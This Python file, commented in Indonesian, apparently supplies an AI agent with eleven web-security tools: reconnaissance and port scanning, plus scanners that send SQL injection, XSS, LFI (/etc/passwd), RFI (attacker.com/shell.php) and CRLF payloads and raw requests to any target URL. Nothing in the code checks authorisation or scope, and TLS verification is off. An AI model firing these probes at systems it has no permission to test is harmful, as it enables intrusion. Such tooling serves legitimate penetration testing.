import json
import requests
import socket
import re
import urllib3
import urllib.parse
import ssl
import hashlib
import base64
import dns.resolver
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from crewai.tools import tool
from typing import Dict, List, Any
from urllib.parse import quote, parse_qs
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# GLOBAL EXECUTION LOGGER (Thread-Safe)
# ==========================================
class ExecutionLogger:
    def __init__(self):
        self.logs: List[Dict[str, Any]] = []
        self.lock = threading.Lock()
    
    def add_log(self, tool_name: str, status: str, message: str, details: Dict = None):
        """Log hasil eksekusi tool dengan timestamp"""
        with self.lock:
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "tool": tool_name,
                "status": status, 
                "message": message,
                "details": details or {}
            }
            self.logs.append(log_entry)
            print(f"[LOG] {log_entry}")
    
    def get_logs(self) -> List[Dict]:
        """Return semua logs"""
        with self.lock:
            return self.logs.copy()
    
    def clear_logs(self):
        """Clear semua logs"""
        with self.lock:
            self.logs.clear()
    
    def get_summary(self) -> Dict:
        """Return ringkasan eksekusi"""
        with self.lock:
            tools_executed = set(log["tool"] for log in self.logs)
            errors = [log for log in self.logs if log["status"] == "ERROR"]
            return {
                "total_logs": len(self.logs),
                "tools_executed": list(tools_executed),
                "error_count": len(errors),
                "duration_seconds": self._calculate_duration()
            }
    
    def _calculate_duration(self) -> float:
        if not self.logs:
            return 0
        first = datetime.fromisoformat(self.logs[0]["timestamp"])
        last = datetime.fromisoformat(self.logs[-1]["timestamp"])
        return (last - first).total_seconds()

exec_logger = ExecutionLogger()


# ==========================================
# TOOL 1: ADVANCED ACTIVE RECON (UPGRADED)
# ==========================================
def scan_port(ip, port):
    """Fungsi internal buat scanning port super cepat"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            return port
    except:
        pass
    return None

@tool("Active Recon Target")
def recon_target(url: str) -> str:
    """
    Tool DEEP RECON untuk Information Gathering tingkat lanjut.
    Mengeksekusi: DNS Resolution, Fast Port Scanning, Deep WAF Detection, 
    Missing Security Headers, dan Tech-Stack Fingerprinting.
    """
    tool_name = "Active Recon Target"
    exec_logger.add_log(tool_name, "START", f"Memulai deep recon untuk {url}")
    
    try:
        print(f"\n[🔍 DEEP RECON] Menganalisis medan tempur: {url}...")
        exec_logger.add_log(tool_name, "PROCESSING", "Parsing URL dan DNS resolution")
        
        # 1. Parsing URL & DNS Resolution
        parsed_url = urllib.parse.urlparse(url)
        domain = parsed_url.netloc.split(':')[0]
        try:
            ip_address = socket.gethostbyname(domain)
            exec_logger.add_log(tool_name, "SUCCESS", f"DNS resolved: {domain} → {ip_address}", {"domain": domain, "ip": ip_address})
        except:
            ip_address = "Gagal resolve IP"
            exec_logger.add_log(tool_name, "WARNING", "DNS resolution gagal", {"domain": domain})

        # 2. Fast Port Scanning (Top 10 Web/Infra Ports)
        exec_logger.add_log(tool_name, "PROCESSING", "Memulai port scanning (Top 10 ports)")
        common_ports = [21, 22, 80, 443, 3306, 5432, 8080, 8443, 9000, 27017]
        open_ports = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda p: scan_port(ip_address if ip_address != "Gagal resolve IP" else "127.0.0.1", p), common_ports)
            open_ports = [p for p in results if p is not None]
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Port scan selesai: {len(open_ports)} port terbuka", {"open_ports": open_ports})

        # 3. HTTP Request untuk Headers & Body Analysis
        exec_logger.add_log(tool_name, "PROCESSING", "Menganalisis HTTP response headers dan body")
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers
        body = response.text.lower()

        # 4. Deep WAF Fingerprinting
        waf_signatures = {
            'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
            'Imperva/Incapsula': ['incapsula', 'visid_incap'],
            'F5 BIG-IP': ['bigip', 'f5'],
            'AWS WAF': ['awselb', 'aws-waf'],
            'Sucuri': ['sucuri/cloudproxy']
        }
        waf_detected = "Tidak terdeteksi WAF standar"
        for waf_name, sigs in waf_signatures.items():
            if any(sig in str(headers).lower() or sig in body for sig in sigs):
                waf_detected = f"POSITIF {waf_name}"
                exec_logger.add_log(tool_name, "WARNING", f"WAF terdeteksi: {waf_name}", {"waf": waf_name})
                break

        # 5. Missing Security Headers Analysis
        sec_headers = ['Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options', 'Content-Security-Policy']
        missing_headers = [h for h in sec_headers if h not in headers]
        exec_logger.add_log(tool_name, "SUCCESS", f"Security headers check: {len(missing_headers)} missing", {"missing_headers": missing_headers})

        # 6. Tech-Stack Fingerprinting
        tech_stack = []
        if 'wp-content' in body or 'wordpress' in body: tech_stack.append("WordPress")
        if 'laravel_session' in str(headers).lower(): tech_stack.append("Laravel")
        if 'PHPSESSID' in str(headers): tech_stack.append("PHP")
        if 'express' in headers.get('X-Powered-By', '').lower(): tech_stack.append("Express.js / Node.js")
        if 'react' in body or 'div id="root"' in body: tech_stack.append("React.js")

        server_type = headers.get('Server', 'Disembunyikan (Good Security)')

        # === MENYUSUN LAPORAN ===
        report = f"""
        === DEEP RECONNAISSANCE REPORT ===
        Target Domain: {domain}
        IP Address: {ip_address}
        
        [+] INFRASTRUCTURE
        - Open Ports (Top 10): {open_ports if open_ports else "Semua port tertutup / Filtered"}
        - Web Server: {server_type}
        - Tech Stack Terdeteksi: {', '.join(tech_stack) if tech_stack else "Tidak terdeteksi / Obfuscated"}
        
        [+] SECURITY POSTURE
        - WAF Status: {waf_detected}
        - Missing Security Headers: {', '.join(missing_headers) if missing_headers else "Semua aman"}
        
        Status Code: {response.status_code}
        """
        
        exec_logger.add_log(tool_name, "SUCCESS", "Deep recon selesai")
        return report

    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Recon gagal: {str(e)}")
        return f"Recon gagal total men. Error: {e}"


# ==========================================
# TOOL 2: SQL Injection Scanner
# ==========================================
@tool("SQL Injection Scanner")
def scan_sql_injection(url: str, params: str = "") -> str:
    """
    Scan untuk kerentanan SQL Injection pada target URL.
    params: comma-separated parameter names (e.g., "id,username,email")
    """
    tool_name = "SQL Injection Scanner"
    exec_logger.add_log(tool_name, "START", f"Memulai SQLi scan pada {url}")
    
    try:
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "admin' --",
            "1' AND '1'='1",
            "' OR 'a'='a"
        ]
        
        param_list = [p.strip() for p in params.split(',')] if params else ["id", "q", "search"]
        vulnerabilities = []
        
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} parameters dengan {len(sql_payloads)} payloads")
        
        for param in param_list:
            for payload in sql_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Simple detection: SQL error patterns
                    sql_errors = ['sql', 'syntax', 'database', 'mysql', 'postgresql', 'syntax error']
                    if any(error in response.text.lower() for error in sql_errors):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "status_code": response.status_code
                        })
                        exec_logger.add_log(tool_name, "WARNING", f"Potential SQLi found: {param}", 
                                          {"param": param, "payload": payload})
                except:
                    pass
        
        if vulnerabilities:
            exec_logger.add_log(tool_name, "SUCCESS", f"Found {len(vulnerabilities)} potential SQLi vulnerabilities")
            return json.dumps({
                "status": "VULNERABLE",
                "vulnerabilities": vulnerabilities,
                "count": len(vulnerabilities)
            }, indent=2)
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "No SQLi vulnerabilities detected")
            return json.dumps({
                "status": "SAFE",
                "vulnerabilities": [],
                "message": "Target appears to be protected against SQLi"
            }, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"SQLi scan gagal: {str(e)}")
        return f"SQLi scan error: {e}"


# ==========================================
# TOOL 3: XSS/CSRF Detector
# ==========================================
@tool("XSS & CSRF Detector")
def detect_xss_csrf(url: str) -> str:
    """
    Deteksi kerentanan XSS dan CSRF pada target.
    """
    tool_name = "XSS & CSRF Detector"
    exec_logger.add_log(tool_name, "START", f"Memulai XSS/CSRF detection pada {url}")
    
    try:
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(1)'>"
        ]
        
        findings = {
            "xss_vulnerabilities": [],
            "csrf_findings": [],
            "missing_csrf_tokens": False
        }
        
        exec_logger.add_log(tool_name, "PROCESSING", "Scanning untuk XSS vectors")
        
        # Test XSS
        for payload in xss_payloads:
            try:
                test_url = f"{url}?test={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if payload in response.text:
                    findings["xss_vulnerabilities"].append({
                        "type": "Reflected XSS",
                        "payload": payload,
                        "severity": "High"
                    })
                    exec_logger.add_log(tool_name, "WARNING", "Reflected XSS detected", {"payload": payload})
            except:
                pass
        
        # Check CSRF tokens
        exec_logger.add_log(tool_name, "PROCESSING", "Checking CSRF protection")
        response = requests.get(url, timeout=5, verify=False)
        csrf_indicators = ['csrf_token', 'authenticity_token', '__token', '_token', 'nonce']
        
        if not any(indicator in response.text.lower() for indicator in csrf_indicators):
            findings["missing_csrf_tokens"] = True
            exec_logger.add_log(tool_name, "WARNING", "CSRF tokens tidak ditemukan")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "CSRF protection terdeteksi")
        
        exec_logger.add_log(tool_name, "SUCCESS", "XSS/CSRF detection selesai")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"XSS/CSRF detection error: {str(e)}")
        return f"XSS/CSRF detection error: {e}"


# ==========================================
# TOOL 4: SSL/TLS Certificate Analyzer
# ==========================================
@tool("SSL/TLS Analyzer")
def analyze_ssl_tls(domain: str) -> str:
    """
    Analisis SSL/TLS certificate dan encryption strength.
    """
    tool_name = "SSL/TLS Analyzer"
    exec_logger.add_log(tool_name, "START", f"Menganalisis SSL/TLS untuk {domain}")
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Connecting ke server dan extracting certificate")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
        
        findings = {
            "domain": domain,
            "cipher_suite": cipher[0] if cipher else "Unknown",
            "protocol_version": cipher[1] if cipher else "Unknown",
            "certificate_subject": cert.get('subject', []),
            "certificate_issuer": cert.get('issuer', []),
            "not_before": cert.get('notBefore', 'Unknown'),
            "not_after": cert.get('notAfter', 'Unknown'),
            "vulnerabilities": []
        }
        
        # Check untuk weak ciphers
        if cipher:
            cipher_name = cipher[0].lower()
            weak_ciphers = ['null', 'export', 'rc4', 'md5', 'des']
            if any(weak in cipher_name for weak in weak_ciphers):
                findings["vulnerabilities"].append({
                    "type": "Weak Cipher Suite",
                    "cipher": cipher_name,
                    "severity": "Medium"
                })
                exec_logger.add_log(tool_name, "WARNING", f"Weak cipher detected: {cipher_name}")
        
        exec_logger.add_log(tool_name, "SUCCESS", "SSL/TLS analysis complete")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"SSL/TLS analysis failed: {str(e)}")
        return f"SSL/TLS analysis error: {e}"


# ==========================================
# TOOL 5: DNS Enumeration & Enumeration
# ==========================================
@tool("DNS & Subdomain Enumerator")
def enumerate_dns_subdomains(domain: str) -> str:
    """
    Enumerate DNS records dan discover subdomains.
    """
    tool_name = "DNS & Subdomain Enumerator"
    exec_logger.add_log(tool_name, "START", f"Memulai DNS enumeration untuk {domain}")
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Querying DNS records (A, MX, NS, TXT)")
        
        dns_records = {
            "domain": domain,
            "A_records": [],
            "MX_records": [],
            "NS_records": [],
            "TXT_records": [],
            "subdomains": []
        }
        
        try:
            # A Records
            answers = dns.resolver.resolve(domain, 'A')
            dns_records["A_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"A records found: {len(dns_records['A_records'])}")
        except:
            exec_logger.add_log(tool_name, "WARNING", "Could not resolve A records")
        
        try:
            # MX Records
            answers = dns.resolver.resolve(domain, 'MX')
            dns_records["MX_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"MX records found: {len(dns_records['MX_records'])}")
        except:
            pass
        
        try:
            # NS Records
            answers = dns.resolver.resolve(domain, 'NS')
            dns_records["NS_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"NS records found: {len(dns_records['NS_records'])}")
        except:
            pass
        
        # Common subdomains brute force
        common_subdomains = ['www', 'mail', 'ftp', 'api', 'admin', 'test', 'dev', 'staging', 'cdn']
        exec_logger.add_log(tool_name, "PROCESSING", f"Attempting subdomain discovery ({len(common_subdomains)} common names)")
        
        for sub in common_subdomains:
            try:
                full_domain = f"{sub}.{domain}"
                socket.gethostbyname(full_domain)
                dns_records["subdomains"].append(full_domain)
                exec_logger.add_log(tool_name, "SUCCESS", f"Subdomain found: {full_domain}")
            except:
                pass
        
        exec_logger.add_log(tool_name, "SUCCESS", "DNS enumeration complete")
        return json.dumps(dns_records, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"DNS enumeration failed: {str(e)}")
        return f"DNS enumeration error: {e}"


# ==========================================
# TOOL 6: Password Strength Checker
# ==========================================
@tool("Password Strength Analyzer")
def analyze_password_strength(password: str) -> str:
    """
    Menganalisis kekuatan password berdasarkan entropy, patterns, dan common attacks.
    """
    tool_name = "Password Strength Analyzer"
    exec_logger.add_log(tool_name, "START", f"Analyzing password strength")
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Calculating entropy and checking patterns")
        
        analysis = {
            "password_length": len(password),
            "character_types": {
                "uppercase": any(c.isupper() for c in password),
                "lowercase": any(c.islower() for c in password),
                "digits": any(c.isdigit() for c in password),
                "special": any(not c.isalnum() for c in password)
            },
            "entropy_bits": 0,
            "common_patterns": [],
            "strength": "Weak",
            "score": 0
        }
        
        # Calculate entropy
        char_set_size = 0
        if analysis["character_types"]["lowercase"]: char_set_size += 26
        if analysis["character_types"]["uppercase"]: char_set_size += 26
        if analysis["character_types"]["digits"]: char_set_size += 10
        if analysis["character_types"]["special"]: char_set_size += 32
        
        if char_set_size > 0:
            import math
            analysis["entropy_bits"] = len(password) * math.log2(char_set_size)
        
        # Check common patterns
        common_patterns = {
            "sequential": r"(abc|bcd|cde|012|123)",
            "repeated": r"(.)\1{2,}",
            "keyboard": r"(qwerty|asdf|zxcv)",
            "dates": r"(19|20)\d{2}"
        }
        
        for pattern_name, pattern in common_patterns.items():
            if re.search(pattern, password.lower()):
                analysis["common_patterns"].append(pattern_name)
                exec_logger.add_log(tool_name, "WARNING", f"Common pattern detected: {pattern_name}")
        
        # Score calculation
        score = 0
        if analysis["character_types"]["uppercase"]: score += 25
        if analysis["character_types"]["lowercase"]: score += 25
        if analysis["character_types"]["digits"]: score += 25
        if analysis["character_types"]["special"]: score += 25
        if len(password) >= 12: score += 10
        if len(password) >= 16: score += 10
        score = min(100, score - len(analysis["common_patterns"]) * 10)
        
        analysis["score"] = score
        if score >= 80:
            analysis["strength"] = "Very Strong"
        elif score >= 60:
            analysis["strength"] = "Strong"
        elif score >= 40:
            analysis["strength"] = "Moderate"
        elif score >= 20:
            analysis["strength"] = "Weak"
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Password strength: {analysis['strength']} ({score}/100)")
        return json.dumps(analysis, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Password analysis failed: {str(e)}")
        return f"Password analysis error: {e}"


# ==========================================
# TOOL 7: API Security Tester
# ==========================================
@tool("API Security Tester")
def test_api_security(api_url: str, method: str = "GET") -> str:
    """
    Test API endpoints untuk common security issues.
    """
    tool_name = "API Security Tester"
    exec_logger.add_log(tool_name, "START", f"Testing API security pada {api_url}")
    
    try:
        findings = {
            "api_url": api_url,
            "authentication": "Unknown",
            "cors_enabled": False,
            "rate_limiting": False,
            "input_validation": "Unknown",
            "vulnerabilities": []
        }
        
        # Test 1: Authentication
        exec_logger.add_log(tool_name, "PROCESSING", "Checking authentication requirements")
        response = requests.request(method, api_url, timeout=5, verify=False)
        if response.status_code == 401:
            findings["authentication"] = "Required (API Key / Bearer Token)"
        elif response.status_code == 200:
            findings["authentication"] = "None (Public Access)"
            findings["vulnerabilities"].append({
                "type": "Missing Authentication",
                "severity": "Critical"
            })
            exec_logger.add_log(tool_name, "WARNING", "API is publicly accessible without authentication")
        
        # Test 2: CORS
        exec_logger.add_log(tool_name, "PROCESSING", "Checking CORS headers")
        headers_check = response.headers
        if 'Access-Control-Allow-Origin' in headers_check:
            findings["cors_enabled"] = True
            if headers_check.get('Access-Control-Allow-Origin') == '*':
                findings["vulnerabilities"].append({
                    "type": "CORS Misconfiguration",
                    "detail": "Allow-Origin: * permits any domain",
                    "severity": "High"
                })
                exec_logger.add_log(tool_name, "WARNING", "CORS is overly permissive")
        
        # Test 3: Rate Limiting
        exec_logger.add_log(tool_name, "PROCESSING", "Checking rate limiting headers")
        if 'X-RateLimit-Limit' in headers_check or 'X-Rate-Limit-Limit' in headers_check:
            findings["rate_limiting"] = True
            exec_logger.add_log(tool_name, "SUCCESS", "Rate limiting detected")
        else:
            findings["vulnerabilities"].append({
                "type": "Missing Rate Limiting",
                "severity": "Medium"
            })
            exec_logger.add_log(tool_name, "WARNING", "No rate limiting headers found")
        
        # Test 4: Security Headers
        exec_logger.add_log(tool_name, "PROCESSING", "Checking security headers")
        required_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security']
        missing = [h for h in required_headers if h not in headers_check]
        if missing:
            findings["vulnerabilities"].append({
                "type": "Missing Security Headers",
                "headers": missing,
                "severity": "Medium"
            })
            exec_logger.add_log(tool_name, "WARNING", f"Missing headers: {missing}")
        
        exec_logger.add_log(tool_name, "SUCCESS", "API security test complete")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"API test failed: {str(e)}")
        return f"API security test error: {e}"


# ==========================================
# TOOL 8: LFI/RFI Scanner
# ==========================================
@tool("LFI/RFI Scanner")
def scan_lfi_rfi(url: str, param: str = "file") -> str:
    """
    Scan untuk Local File Inclusion (LFI) dan Remote File Inclusion (RFI).
    """
    tool_name = "LFI/RFI Scanner"
    exec_logger.add_log(tool_name, "START", f"Scanning LFI/RFI pada {url}")
    
    try:
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        rfi_payloads = [
            "http://attacker.com/shell.php",
            "https://attacker.com/payload.txt",
            "ftp://attacker.com/file.txt"
        ]
        
        findings = {
            "lfi_vulnerabilities": [],
            "rfi_vulnerabilities": []
        }
        
        # Test LFI
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(lfi_payloads)} LFI payloads")
        for payload in lfi_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if 'root:' in response.text or 'bin/bash' in response.text:
                    findings["lfi_vulnerabilities"].append({
                        "parameter": param,
                        "payload": payload,
                        "evidence": "File contents visible"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"LFI vulnerability found", {"payload": payload})
            except:
                pass
        
        # Test RFI (careful simulation)
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(rfi_payloads)} RFI patterns")
        for payload in rfi_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    findings["rfi_vulnerabilities"].append({
                        "parameter": param,
                        "payload_pattern": payload,
                        "risk": "Potential RFI - further manual testing needed"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"RFI pattern returned 200", {"payload": payload})
            except:
                pass
        
        if not findings["lfi_vulnerabilities"] and not findings["rfi_vulnerabilities"]:
            exec_logger.add_log(tool_name, "SUCCESS", "No LFI/RFI vulnerabilities detected")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "LFI/RFI scan complete")
        
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"LFI/RFI scan failed: {str(e)}")
        return f"LFI/RFI scan error: {e}"


# ==========================================
# TOOL 9: Header Injection Tester
# ==========================================
@tool("Header Injection Tester")
def test_header_injection(url: str) -> str:
    """
    Test untuk Header Injection vulnerabilities (HTTP Response Splitting, CRLF Injection).
    """
    tool_name = "Header Injection Tester"
    exec_logger.add_log(tool_name, "START", f"Testing header injection pada {url}")
    
    try:
        injection_payloads = {
            "CRLF": "\r\nX-Injected: true",
            "CRLFx2": "\r\n\r\nInjected-Body",
            "LF": "\nX-Injected: true",
            "Null-Byte": "%00X-Injected: true"
        }
        
        findings = {
            "url": url,
            "header_injection_vulnerabilities": []
        }
        
        exec_logger.add_log(tool_name, "PROCESSING", "Testing header injection vectors")
        
        for injection_type, payload in injection_payloads.items():
            try:
                # Test dengan custom header
                headers = {
                    "User-Agent": f"Mozilla/5.0{payload}",
                    "X-Test": payload
                }
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                
                # Check jika payload ada di response headers
                if "Injected" in response.text or injection_type in response.text:
                    findings["header_injection_vulnerabilities"].append({
                        "type": injection_type,
                        "payload": payload,
                        "severity": "High"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"{injection_type} injection may be possible")
            except:
                pass
        
        if findings["header_injection_vulnerabilities"]:
            exec_logger.add_log(tool_name, "SUCCESS", f"Found {len(findings['header_injection_vulnerabilities'])} potential header injection vectors")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "No header injection vulnerabilities detected")
        
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Header injection test failed: {str(e)}")
        return f"Header injection test error: {e}"


# ==========================================
# TOOL 10: Baca Log Burp Suite 
# ==========================================
@tool("Baca Log Burp Suite")
def baca_log_burp(file_path: str) -> str:
    """Membaca file hasil export HTTP History dari Burp Suite (format JSON)."""
    tool_name = "Baca Log Burp Suite"
    exec_logger.add_log(tool_name, "START", f"Reading Burp log dari {file_path}")
    
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        
        exec_logger.add_log(tool_name, "PROCESSING", f"Parsing {len(data)} HTTP requests")
        
        hasil_parsing = []
        for item in data[:5]:  
            req_data = {
                "url": item.get("url", ""),
                "method": item.get("method", ""),
                "headers": item.get("request", {}).get("headers", ""),
                "body": item.get("request", {}).get("body", "")
            }
            hasil_parsing.append(req_data)
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Successfully parsed {len(hasil_parsing)} requests")
        return json.dumps(hasil_parsing, indent=2)
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Error baca log Burp: {e}")
        return f"Error baca log Burp: {e}"


# ==========================================
# TOOL 11: Tembak Request HTTP (ORIGINAL - UPGRADED)
# ==========================================
@tool("Tembak Request HTTP")
def tembak_payload(url: str, method: str, headers_json: str, body_data: str) -> str:
    """Mengirim HTTP request (payload) secara langsung ke target."""
    tool_name = "Tembak Request HTTP"
    exec_logger.add_log(tool_name, "START", f"Executing {method} request to {url}")
    
    try:
        headers = json.loads(headers_json) if headers_json else {}
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

        exec_logger.add_log(tool_name, "PROCESSING", f"Sending {method} payload")
        
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=10, verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=body_data, timeout=10, verify=False)
        else:
            exec_logger.add_log(tool_name, "ERROR", f"Method {method} not supported")
            return f"Method {method} belum didukung."
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Got response: {response.status_code}")
        return f"Status Code: {response.status_code}\nResponse Body: {response.text[:1000]}"
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Request failed: {str(e)}")
        return f"Request gagal: {e}"


# ==========================================
# HELPER: Export Logs Function
# ==========================================
def get_execution_logs() -> Dict:
    """Return all execution logs (for API exposure)"""
    return {
        "logs": exec_logger.get_logs(),
        "summary": exec_logger.get_summary()
    }

def clear_execution_logs():
    """Clear all execution logs"""
    exec_logger.clear_logs()